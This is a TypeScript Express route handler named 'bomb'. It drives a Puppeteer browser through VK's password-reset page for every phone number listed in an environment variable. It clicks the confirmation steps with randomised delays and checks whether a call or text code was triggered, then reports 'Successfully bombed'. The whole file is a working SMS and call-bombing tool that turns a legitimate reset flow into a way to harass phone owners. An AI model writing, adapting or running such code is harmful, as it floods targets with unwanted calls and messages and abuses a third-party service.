import { Request, Response } from "express";
import puppeteer from "puppeteer";
import wait from "./utils/wait";
import selectors from "./selectors";
import range from "./utils/range";
import fs from "node:fs";
import doesStrExistOnPage from "./utils/doesStrExistOnPage";

export async function bomb(req: Request, res: Response) {
  const phoneNumbersStr = process.env.PHONE_NUMBERS;
  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
  
  const phoneNumbers = phoneNumbersStr.split(" ");
  
  const browser = await puppeteer.launch({ headless: false });
  console.log("Browser launched...");
  
  for (let i = 0; i < phoneNumbers.length; i++) {
    const phoneNumber = phoneNumbers[i];
    const page = await browser.newPage();
    
    await page.goto("https://id.vk.com/restore/#/resetPassword");
    await wait(range(1000, 5000));
  
    await page.waitForSelector(selectors.phoneNumberInput);
    await page.type(selectors.phoneNumberInput, phoneNumber);
    await wait(range(500, 1000));
    await page.keyboard.down("Enter");
  
    await page.waitForSelector(selectors.firstConfirmBtn);
    await wait(range(1000, 3000));
    await page.click(selectors.firstConfirmBtn);
    await wait(5000);
  
    const shouldConfirmAgainBtn = await page.$(selectors.secondConfirmBtn);
    if (shouldConfirmAgainBtn) await page.click(selectors.secondConfirmBtn);
    console.log(shouldConfirmAgainBtn);
    
    await wait(5000);

    const hasCalled = await doesStrExistOnPage(page, "Last 4 digits");
    const hasTexted = await doesStrExistOnPage(page, "We have sent a text message");

    if (hasCalled) {
      console.log("calling");
    } else if (hasTexted) {
      console.log("sent text msg");
    } else throw new Error(`neither code delivery behavior is detected`);

    await wait(range(1000, 5000));

  


  }
  // await browser.close();

  res.status(200).send("Successfully bombed");
}
